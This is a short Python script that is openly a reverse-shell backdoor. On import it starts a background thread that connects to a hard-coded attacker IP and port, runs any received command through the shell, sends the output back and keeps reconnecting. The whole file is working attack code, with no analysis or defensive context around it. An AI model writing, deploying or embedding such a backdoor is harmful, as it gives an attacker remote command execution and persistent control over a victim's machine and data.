import socket
import subprocess
import os
import threading
import time
import sys

ATTACKER_IP = "192.168.56.1"  # change this to ur attacker's ip!
ATTACKER_PORT = 4444

def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            s.send(b"\n[+] Connected to victim\n> ")
            
            while True:
                command = s.recv(1024).decode().strip()
                
                if not command or command.lower() == 'exit':
                    break
                
                if command.lower().startswith('cd '):
                    try:
                        os.chdir(command[3:])
                        result = f"Directory changed to: {os.getcwd()}\n"
                    except:
                        result = "Failed to change directory\n"
                else:
                    try:
                        result = subprocess.check_output(
                            command, 
                            shell=True,
                            stderr=subprocess.STDOUT,
                            timeout=10
                        ).decode('utf-8', errors='ignore')
                    except subprocess.TimeoutExpired:
                        result = "Command timed out\n"
                    except Exception as e:
                        result = f"Error: {str(e)}\n"
                
                s.send(result.encode())
                s.send(b"> ")
            
            s.close()
        except Exception as e:
            time.sleep(5)
        time.sleep(2)

# Start backdoor in background
thread = threading.Thread(target=reverse_shell, daemon=True)
thread.start()